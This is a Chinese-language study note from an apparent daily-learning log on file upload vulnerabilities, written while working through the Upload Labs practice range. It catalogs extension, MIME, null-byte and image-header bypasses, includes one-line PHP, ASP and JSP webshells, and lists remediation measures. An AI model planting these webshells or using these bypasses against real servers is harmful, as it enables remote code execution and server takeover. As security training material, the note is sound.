# 2026-07-31 文件上传漏洞体系（总览）

> 🧠 **[打开交互式思维导图](https://monney-sys.github.io/daily-learning/mindmaps/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html)**（滚轮缩放 · 拖拽平移 · 点击折叠分支）

## 一、原理

文件上传漏洞的本质是：**Web 应用对用户上传的文件缺乏有效校验，导致攻击者上传可执行脚本（如 PHP、JSP、ASPX），进而在服务器端执行任意代码。**

核心风险路径：

```
用户上传文件 → 校验缺失/可绕过 → 文件落到服务器目录 → 攻击者访问该文件 → 代码执行 → 服务器失陷
```

文件上传本身不是漏洞，"能上传恶意文件 + 能访问执行" 才是。

---

## 二、验证/绕过体系

### 2.1 前端校验

**JS 类防护**：浏览器端用 JavaScript 校验文件后缀，仅在客户端执行。

| 绕过方法 | 说明 |
|----------|------|
| 禁用浏览器 JS | 设置里直接关掉 JavaScript |
| F12 改 DOM | 删除 `<input>` 的 `onchange` / `onsubmit` 绑定 |
| Burp 抓包改后缀 | 先改合法后缀绕过 JS，Burp 拦截后改回 `.php` |
| 直接构造请求 | Python `requests` / `curl` 发 multipart，完全不走浏览器 |

> **实战**：Pass-01 仅前端校验，四种方法均可绕过。

### 2.2 后端校验：黑名单

| 绕过手法 | 原理 | 示例 | 对应关卡 |
|----------|------|------|----------|
| **特殊解析后缀** | 黑名单漏掉非标准 PHP 后缀 | `.php3` `.php4` `.php5` `.phtml` `.pht` | Pass-03 |
| **大小写绕过** | 黑名单没覆盖所有大小写组合 | `.Php` `.PhP` `.PHP` | Pass-05 |
| **空格绕过** | 末尾加空格，`trim()` 没过滤 | `shell.php `（末尾空格） | Pass-06 |
| **点绕过** | 末尾加点，`deldot()` 没过滤 | `shell.php.` | Pass-07 |
| `::$DATA` 绕过 | Windows NTFS 流特性 | `shell.php::$DATA` | Pass-08 |
| `.htaccess` 解析 | 上传 .htaccess 让 `.jpg` 当 PHP 跑 | `AddType application/x-httpd-php .jpg` | Pass-04 |
| 双后缀绕过 | 黑名单只过滤一次（无循环替换） | `shell.pphphp` → 去掉 `php` → `shell.php` | Pass-02 |
| 配合解析漏洞 | 后缀虽非 PHP，但被中间件解析 | `shell.jpg/1.php`（Nginx） | 见解析漏洞笔记 |

> **Windows 特性注意**：末尾空格和末尾点在 Windows 文件系统上会被自动去掉，使 `shell.php.` 变成 `shell.php` 从而执行。Linux（如 Docker）不会去掉，需修改 Apache 配置配合。

### 2.3 后端校验：白名单

| 绕过手法 | 原理 | 示例 |
|----------|------|------|
| **MIME 绕过** | `Content-Type` 头由客户端控制 | Burp 改为 `image/jpeg` |
| **%00 截断** | PHP < 5.3.4 空字节截断 | `shell.php%00.jpg`（GET 传参） |
| **0x00 截断** | multipart 中插入 raw `\x00` | Burp Hex 模式在文件名中插入 `00` |
| **0x0a 截断** | 换行符截断（某些环境） | `shell.php%0a.jpg` |

> **%00 细节**：`$_GET['filename']` 会自动 URL 解码 `%00` → `\x00`；但 `$_FILES['file']['name']`（multipart）不会解码，必须在 Burp Hex 模式手动插入 raw 0x00 字节。

### 2.4 后端校验：内容及其他

| 检测方式 | 原理 | 绕过方法 |
|----------|------|----------|
| **文件头检测** | 读前 N 字节判断类型 | 在 webshell 前面加 `GIF89a` 或 `‰PNG` |
| **getimagesize()** | PHP 函数取图片宽高 | 伪造一个最小合法图片头 + 后面接 webshell |
| **exif_imagetype()** | 读 EXIF 信息 | 同上，伪造图片头 |
| **二次渲染** | 用 GD/ImageMagick 重绘图片 | 在图片"安全区域"（如 EXIF 注释字段）嵌入 webshell |
| **条件竞争** | 先上传临时文件 + 在删除前访问 | 并发请求：一个不停上传，一个不停访问 |

---

## 三、整体攻击方法论

### 3.1 上传点发现

```
常规功能      CMS/框架       编辑器         第三方/CVE
─────────────────────────────────────────────────────
头像上传      织梦会员中心    FCKeditor      ActiveMQ
文件导入      WP 媒体库       KindEditor     Jenkins
附件上传      Dede 后台       UEditor        Confluence
相册/图库     各种插件        eWebEditor     OA 系统
```

### 3.2 判断/验证流程

```
发现上传点
    │
    ├── 正常传一个测试文件 → 成功？
    │       │                 └── 返回什么？路径？文件名？
    │       │
    │       ├── 判断：前端校验 / 后端校验？
    │       │       └── Burp 抓包，改后缀 → 看是否被拦
    │       │
    │       ├── 判断：黑名单 / 白名单 / 内容校验？
    │       │       └── 逐个尝试 2.2 ~ 2.4 的绕过手法
    │       │
    │       └── 判断：是什么解析环境？
    │               ├── Apache？→ 试 .htaccess / 多后缀 / CVE-2017-15715
    │               ├── Nginx？ → 试 shell.jpg/1.php / CVE-2013-4547
    │               ├── IIS？   → 试 1.asp;.jpg / shell.jpg/1.php
    │               └── Tomcat？→ 试 PUT 上传 / CVE-2017-12615
    │
    └── 上传成功后 → 怎么执行？
            ├── 直接访问 webshell URL
            ├── 配合文件包含 → ?page=../upload/shell.jpg
            ├── 配合 .htaccess / .user.ini
            └── 条件竞争 → 抢在删除前访问
```

### 3.3 一句话 webshell 速查

```php
# PHP
<?php @eval($_POST['cmd']); ?>

# ASP
<%eval request("cmd")%>

# JSP
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

---

## 四、安全修复方案

| 层级 | 措施 |
|------|------|
| **文件名校验** | 白名单，仅允许必要后缀（`.jpg .png .pdf`），**不接受用户输入的文件名** |
| **文件重命名** | 上传后随机生成 UUID 文件名，扩展名由后端强制指定 |
| **内容校验** | 校验文件头 + 实际内容 + 二次渲染，不只凭 MIME 和扩展名 |
| **存储隔离** | 上传目录在 Web 根目录之外，或对上传目录设置 `php_flag engine off` |
| **访问控制** | 上传目录禁止脚本执行权限，Nginx 用 `location ~ \.php$ { deny all; }` |
| **限制大小** | 限制文件大小和上传频率，防 DoS |
| **权限最小化** | Web 运行用户对上传目录只有写权限，无执行权限 |
| **更新组件** | 及时更新 CMS、编辑器、中间件版本，修复已知 CVE |

---

## 五、今日实战进度（Upload Labs）

| 关卡 | 校验方式 | 绕过手法 | 状态 |
|------|----------|----------|------|
| Pass-01 | 前端 JS 校验 | Burp 抓包改后缀 | ✅ |
| Pass-02 | 仅校验 `Content-Type` | Burp 改 MIME 为 `image/jpeg` | ✅ |
| Pass-03 | 黑名单（`.asp .aspx .php .jsp`）| `.php3` + 修改 Apache 配置 | ✅ |
| Pass-04 | 黑名单（全 PHP 后缀，含大小写）| `.htaccess` 让 `.jpg` 当 PHP 跑 | ✅ |
| Pass-05 | 黑名单，**无 `strtolower`** | `.Php` 大小写绕过 | ✅ |
| Pass-06 | 黑名单，**无 `trim`** | `shell.php ` 末尾空格绕过 | ✅ |
| Pass-07 | 黑名单，**无 `deldot`** | `shell.php.` 末尾点绕过 | ✅ |

### 环境调整记录

由于 Docker（Linux）与原始靶场（Windows）的文件系统差异，修改了 Apache 配置：

```apache
# 当前配置（/etc/apache2/conf-enabled/docker-php.conf）
<FilesMatch "(?i)\.(php|php3|php4|php5|phtml|pht)\s*$">
    SetHandler application/x-httpd-php
</FilesMatch>
```

- `(?i)` — 忽略大小写（适配 Pass-05 大小写绕过）
- `\s*` — 容忍扩展名末尾空白（适配 Pass-06 空格绕过）
- 多后缀支持 `php3/4/5/phtml/pht`（适配 Pass-03 特殊后缀）

---

## 六、总结

### 核心认知

文件上传是"校验 + 解析"的组合攻防。校验层面看后端代码的质量（黑名单覆盖面、trim/deldot/strtolower 的完整度），解析层面看中间件/文件系统的特性（后缀匹配逻辑、空字节处理、NTFS 流）。

### 关联笔记

- [解析漏洞（Apache/Nginx/IIS）](./2026-07-31-file-upload-parser-vulnerability.md)
- [编辑器与 CMS 文件上传漏洞](./2026-07-31-file-upload-editor-cms.md)
- [近年文件上传 CVE（2024-2026）](./2026-07-31-file-upload-recent-cve.md)

### 待深入

- [ ] Pass-08 ~ Pass-21 继续过关
- [ ] 条件竞争上传实操
- [ ] Nginx/IIS 解析漏洞搭建复现
- [ ] Apache Struts CVE-2024-53677 复现
- [ ] Laravel FileManager CVE-2025-56399 复现

> ⚠️ 声明：以上技术仅用于授权靶场和渗透测试授权目标，未经授权使用属于违法行为。
